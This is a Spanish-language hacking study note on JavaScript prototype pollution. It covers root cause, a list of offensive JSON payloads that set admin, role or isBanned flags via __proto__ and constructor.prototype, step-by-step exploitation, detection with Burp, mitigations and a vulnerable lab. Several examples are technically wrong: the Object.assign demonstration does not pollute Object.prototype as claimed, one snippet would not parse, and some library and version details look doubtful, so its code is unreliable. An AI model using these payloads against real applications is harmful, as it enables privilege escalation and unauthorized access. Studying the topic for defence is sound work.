##  📚**Índice**

- [[#🔥 1. Concepto real de Prototype Pollution (explicado como hacker)]]
- [[#🧬 2. Cómo funciona JavaScript por dentro (prototypes)]]
- [[#⚠️ 3. ¿Por qué existe la vulnerabilidad? (root cause)]]
- [[#💥 4. Cómo explota un atacante Prototype Pollution]]
- [[#🧪 5. Payloads ofensivos reales (**proto**, constructor, prototype)]]
- [[#🔁 6. Vectores comunes: merge, extend, deepClone, defaults]]
- [[#🕵️ 7. Explotación práctica paso a paso (JavaScript puro)]]
- [[#🚀 8. Escenarios reales de ataque en aplicaciones web]]
- [[#🎯 9. Cómo verificar si la app es vulnerable]]
- [[#🛡️ 10. Cómo mitigar (server + client)]]
- [[#🐳 11. Laboratorio vulnerable SKF-LABS]]
- [[#📎 12. Recursos externos]]

---

# 🔥 **1. Concepto real de Prototype Pollution (explicado como hacker)**

Prototype Pollution = **inyectar propiedades arbitrarias dentro del prototipo global de JavaScript** (`Object.prototype`).

Cuando logras modificar el prototipo, **afecta a TODOS los objetos** que heredan de él.

Ejemplo rápido:

```javascript
{}.__proto__.admin = true
```

Ahora **cualquier objeto nuevo** creado en esa app tendrá:

```javascript
obj.admin === true
```

Y si la app asume algo como:

```javascript
if (user.admin) {
    showAdminPanel();
}
```

→ **RCE lógico** → **privilegios escalados** → **compromiso total de la app**.

---

# 🧬 **2. Cómo funciona JavaScript por dentro (prototypes)**

Todos los objetos en JS comparten un prototipo:

```
obj → Object.prototype
```

Si modificas:

```javascript
Object.prototype.hacked = "YES"
```

Entonces cualquier objeto:

```javascript
const u = {};
console.log(u.hacked); // "YES"
```

Esto hace que Prototype Pollution sea un ataque tan destructivo.

---

# ⚠️ **3. ¿Por qué existe la vulnerabilidad? (root cause)**

Los devs suelen hacer merges de objetos así:

```javascript
const final = Object.assign(target, source);
```

O peor:

```javascript
for (key in userInput) {
    obj[key] = userInput[key];
}
```

Si el atacante envía:

```json
{
  "__proto__": {
    "admin": true
  }
}
```

O:

```json
{
  "constructor": {
    "prototype": {
        "admin": true
    }
  }
}
```

→ **contaminas el prototipo global**.

Esto pasa porque:

- Los frameworks no validan claves peligrosas.
    
- Los devs confían demasiado en `Object.assign()`, `lodash.merge`, `jQuery.extend()`, etc.
    

---

# 💥 **4. Cómo explota un atacante Prototype Pollution**

Vectores reales:

1. **Input mal validado** en formularios, JSON, APIs, AJAX.
    
2. Envías un payload con keys especiales:
    
    - `__proto__`
        
    - `prototype`
        
    - `constructor`
        
3. El backend mergea estos datos.
    
4. El prototipo global queda contaminado.
    
5. Todos los objetos pasan a tener propiedades maliciosas.
    

Impacto:

- ⭐ Escalada de privilegios
    
- 🔥 Manipulación de lógica interna
    
- 🧪 Bypass de validaciones
    
- 💰 Acceso no autorizado
    
- 🧨 RCE indirecto (NodeJS en ciertos casos)
    
- 🕵️ Tomar control de flujos completos
    

---

# 🧪 **5. Payloads ofensivos reales (**proto**, constructor, prototype)**

### ✔ Payload básico

```json
{
  "__proto__": {
    "admin": true
  }
}
```

### ✔ Payload para NodeJS

```json
{
  "constructor": {
    "prototype": {
      "access": "root"
    }
  }
}
```

### ✔ Payload para contaminar lógica de auth

```json
{
  "__proto__": {
    "role": "admin"
  }
}
```

### ✔ Payload para activar flags internos

```json
{
  "__proto__": { "debug": true }
}
```

### ✔ Payload malicioso + bypass

```json
{
  "__proto__": { "toString": "hacked" }
}
```

---

# 🔁 **6. Vectores comunes: merge, extend, deepClone, defaults**

Frameworks vulnerables históricamente:

- `lodash.merge()`
    
- `lodash.defaultsDeep()`
    
- `jQuery.extend(true, ...)`
    
- `Hoek.merge()` (Hapi.js)
    
- `deepmerge()`
    
- `Object.assign()`
    

Ejemplo clásico vulnerable:

```javascript
const config = lodash.merge({}, defaultConfig, userInput);
```

Si `userInput` contiene `__proto__`, se contamina todo.

---

# 🕵️ **7. Explotación práctica paso a paso (JavaScript puro)**

### Estado inicial:

```javascript
const user = { name: "daniel" };
console.log(user.admin); // undefined
```

### Atacante envía:

```json
{
  "__proto__": {
    "admin": true
  }
}
```

Y backend hace:

```javascript
Object.assign(config, userInput);
```

### Resultado:

```javascript
const u = {};
console.log(u.admin); // true  (😈 hack exitoso)
```

Cualquier objeto ahora es admin.

---

# 🚀 **8. Escenarios reales de ataque en aplicaciones web**

### 🔥 1. Saltarse roles

```javascript
if (user.role === "admin") { ... }
```

Si polucionas:

```json
{
  "__proto__": { "role": "admin" }
}
```

→ Admin instantáneo.

---

### 🔥 2. Desactivar validaciones del servidor

Muchos devs hacen:

```javascript
if (!user.isBanned) login();
```

Tu payload:

```json
{
  "__proto__": { "isBanned": false }
}
```

---

### 🔥 3. Tomar control del sistema de logs

```javascript
logger.level = config.logLevel;
```

Payload:

```json
{
  "__proto__": { "logLevel": "debug" }
}
```

Filtras información sensible.

---

### 🔥 4. NodeJS RCE (casos específicos)

Manipulando propiedades prototype que controlan funciones internas → en algunos contextos permite ejecución arbitraria.

---

# 🎯 **9. Cómo verificar si la app es vulnerable**

Método simple:

1. Envía:
    

```json
{"__proto__":{"polluted": "YES"}}
```

2. Luego fuerza al servidor a crear un objeto nuevo.
    
3. Verifica con Burp:
    

- ¿Aparece `"polluted": "YES"` en respuestas sin enviarlo?
    
- ¿Cambia el comportamiento?
    
- ¿Afecta peticiones posteriores?
    

### Prueba rápida en consola del navegador:

```javascript
({}).polluted
```

Si === `"YES"` → **vulnerable**.

---

# 🛡️ **10. Cómo mitigar (server + client)**

### ✔ Lista negra de claves peligrosas:

- `__proto__`
    
- `prototype`
    
- `constructor`
    

### ✔ Validar claves permitidas (whitelist)

### ✔ Usar librerías seguras de merge:

- deepmerge con `options: { allowProtoProperty: false }`
    
- lodash 4.17.5+ (parcheada)
    
- jQuery 3.4.0+ (parcheada)
    

### ✔ Evitar merges profundos de input externo

### ✔ Congelar prototipos

```javascript
Object.freeze(Object.prototype);
```

### ✔ Sanitizar JSON antes de parsearlo

---

# 🐳 **11. Laboratorio vulnerable SKF-LABS**

Repositorio oficial:

```
https://github.com/blabla1337/skf-labs
```

Ahí tienes desafíos específicos de Prototype Pollution:

- Pollution en front-end
    
- Pollution en backend NodeJS
    
- Pollution vía merge
    
- Pollution vía query params
    
- Pollution vía JSON en API
    

---

# 📎 **12. Recursos externos**

- Payload All The Things (Prototype Pollution)
    
- HackTricks (JS Prototype Pollution)
    
- SonarSource research
    
- OWASP JS Security Guide
    

---
